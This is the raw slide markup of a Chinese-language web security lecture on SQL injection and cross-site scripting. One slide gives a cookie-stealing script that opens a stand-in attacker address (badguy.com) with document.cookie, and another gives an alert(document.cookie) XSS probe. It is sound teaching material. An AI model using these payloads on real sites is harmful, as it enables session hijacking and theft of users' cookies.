              <a:t>语句。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注入漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>-SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="192086" y="1341915"/>
            <a:ext cx="8485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MS SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>具有一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>个增强的内置功能支持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令执行。在这样的上下文中进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入可能是灾难性的。例如，查询表单：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7311" y="3811371"/>
            <a:ext cx="2579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 smtClean="0"/>
              <a:t>构造出的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语句如下：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11" y="2195759"/>
            <a:ext cx="8914905" cy="39089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35" y="3160645"/>
            <a:ext cx="4902009" cy="47134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7311" y="2688983"/>
            <a:ext cx="557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 smtClean="0"/>
              <a:t>如果一个攻击者输入以下内容：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70" y="4356169"/>
            <a:ext cx="8402805" cy="41666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470" y="4960884"/>
            <a:ext cx="4325838" cy="39325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470" y="5620197"/>
            <a:ext cx="2355157" cy="3300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跨站脚本（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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1246008"/>
            <a:ext cx="9086850" cy="43070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跨站脚本（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600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563" y="1225550"/>
            <a:ext cx="8813038" cy="4489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跨站脚本（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0" smtClean="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="36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1246008"/>
            <a:ext cx="9086850" cy="43070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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>跨站脚本（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）漏洞</a:t>
            </a:r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229600" cy="379888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   Cross-Site Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> (XSS) flaws occur whenever an application takes user supplied data and sends it to a web browser without first validating or encoding that content. XSS allows attackers to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>execute script in the victim's browser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> which can hijack user sessions, deface web sites, possibly introduce worms, etc.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31108" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="611188" y="1311275"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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跨站脚本攻击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1306513"/>
            <a:ext cx="8229600" cy="1150937"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>工作原理： 输入插入包含有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>或其它恶意脚本的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>标签代码。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412676" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="4149725"/>
            <a:ext cx="8229600" cy="1871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15000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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问题根源：不当的服务器端输入检查，从而允许用户输入可被客户端浏览器解释的脚本命令。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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XSS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是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最普遍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Web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程序安全问题。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412677" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="884238" y="2457450"/>
            <a:ext cx="7416800" cy="1511300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/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000" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>嵌入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JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>脚本的例子：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1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lvl="1"/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&lt;script&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl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window.open(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2"/>
              </a:rPr>
              <a:t>http://badguy.com/info.pl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?document.cookie </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl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2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2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2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2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2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2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7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018" name="Picture 34" descr="图片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8538" y="3932238"/>
            <a:ext cx="3598862" cy="2089150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426017" name="Picture 33" descr="图片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8538" y="1341438"/>
            <a:ext cx="3671887" cy="2087562"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic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4450"/>
            <a:ext cx="7129463" cy="792163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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击的原理</a:t>
            </a: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gray">
          <a:xfrm>
            <a:off x="6996113" y="4292600"/>
            <a:ext cx="1752600" cy="750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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft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带有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XSS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漏洞的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Web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程序  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25990" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5754688" y="2709863"/>
            <a:ext cx="1066800" cy="7334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425991" name="Picture 7" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="1763713"/>
            <a:ext cx="1093787" cy="1268412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425994" name="Line 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5881688" y="3860800"/>
            <a:ext cx="1066800" cy="8016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25997" name="Rectangle 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3276600" y="2276475"/>
            <a:ext cx="2560638" cy="587375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFCC"/>
          </a:solidFill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90000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>攻击者将恶意脚本输入到服务器上的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>页面</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1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30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1639888" y="936625"/>
            <a:ext cx="2500312" cy="417513"/>
            <a:chOff x="1033" y="590"/>
            <a:chExt cx="1575" cy="263"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425995" name="Rectangle 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1321" y="590"/>
              <a:ext cx="128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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">
                <a:lnSpc>
                  <a:spcPct val="115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攻击者设置陷阱 </a:t>
              </a:r>
              <a:endPara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5998" name="Oval 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1033" y="618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3" name="Group 31"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1639888" y="3560763"/>
            <a:ext cx="4587875" cy="373062"/>
            <a:chOff x="1033" y="2243"/>
            <a:chExt cx="2890" cy="235"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425993" name="Oval 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1033" y="2243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25999" name="Rectangle 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1338" y="2251"/>
              <a:ext cx="2585" cy="16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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">
                <a:lnSpc>
                  <a:spcPct val="115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受害者浏览页面 </a:t>
              </a:r>
              <a:endPara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32"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="6021388"/>
            <a:ext cx="5735637" cy="444500"/>
            <a:chOff x="537" y="3785"/>
            <a:chExt cx="3613" cy="280"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425992" name="Oval 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="537" y="3785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26000" name="Rectangle 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="916" y="3793"/>
              <a:ext cx="3234" cy="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 anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">
                <a:lnSpc>
                  <a:spcPct val="115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脚本将受害者的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Session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、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Cookie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发送给攻击者  </a:t>
              </a:r>
              <a:endPara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426001" name="Rectangle 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3133725" y="4826000"/>
            <a:ext cx="2590800" cy="835025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFCC"/>
          </a:solidFill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90000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>运行于受害者浏览器的脚本可以完全访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>和 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>cookies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6932613" y="2852738"/>
            <a:ext cx="1455737" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426003" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144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>
                <a:rot lat="420000" lon="0" rev="0"/>
              </a:camera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Custom Code</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426004" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023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Accounts</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426005" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139" y="2193"/>
              <a:ext cx="726" cy="79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Finance</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426006" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4262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Administration</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426007" name="Rectangle 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375" y="2193"/>
              <a:ext cx="726" cy="79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Transactions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426008" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498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Communication</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426009" name="Rectangle 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609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Knowledge Mgmt</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426010" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725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E-Commerce</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426011" name="Rectangle 27"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4842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Bus. Functions</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426012" name="Picture 28" descr="businesswoma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7088" y="4178300"/>
            <a:ext cx="1050925" cy="1255713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426013" name="Freeform 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="323850" y="2676525"/>
            <a:ext cx="2768600" cy="3235325"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="1744" y="1704"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="976" y="2184"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="160" y="2184"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="16" y="1320"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="64" y="216"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="352" y="24"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1744" h="2328">
                <a:moveTo>
                  <a:pt x="1744" y="1704"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1492" y="1904"/>
                  <a:pt x="1240" y="2104"/>
                  <a:pt x="976" y="2184"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="712" y="2264"/>
                  <a:pt x="320" y="2328"/>
                  <a:pt x="160" y="2184"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="2040"/>
                  <a:pt x="32" y="1648"/>
                  <a:pt x="16" y="1320"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="992"/>
                  <a:pt x="8" y="432"/>
                  <a:pt x="64" y="216"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="120" y="0"/>
                  <a:pt x="236" y="12"/>
                  <a:pt x="352" y="24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2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4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42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90" grpId="0" animBg="1"/>
      <p:bldP spid="425994" grpId="0" animBg="1"/>
      <p:bldP spid="425997" grpId="0" animBg="1"/>
      <p:bldP spid="426001" grpId="0" animBg="1"/>
      <p:bldP spid="4260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XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>漏洞</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>探测示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="42701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981075"/>
            <a:ext cx="5111750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7023" name="Picture 1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25575" y="4089400"/>
            <a:ext cx="3001963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427024" name="Rectangle 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="1741488"/>
            <a:ext cx="32004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“Search”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框内的文本信息常会反馈回用户页面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27025" name="AutoShape 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4643438" y="1801813"/>
            <a:ext cx="1000125" cy="404812"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 61765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26" name="Rectangle 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="576263" y="2708275"/>
            <a:ext cx="5724525" cy="473075"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="0000FF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>
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400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427027" name="Rectangle 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5940425" y="4371975"/>
            <a:ext cx="29718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脚本执行并将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Session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信息通过对话框显示出来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27028" name="AutoShape 20"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="4714875" y="4508500"/>
            <a:ext cx="1009650" cy="406400"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 62109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29" name="Rectangle 21"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692275" y="1863725"/>
            <a:ext cx="1511300" cy="28892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27030" name="Rectangle 22"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7524750" y="2708275"/>
            <a:ext cx="1008063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攻击测试脚本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27031" name="AutoShape 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="6442075" y="2781300"/>
            <a:ext cx="1009650" cy="406400"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 62109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7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7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42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4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42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42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42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42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42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24" grpId="0"/>
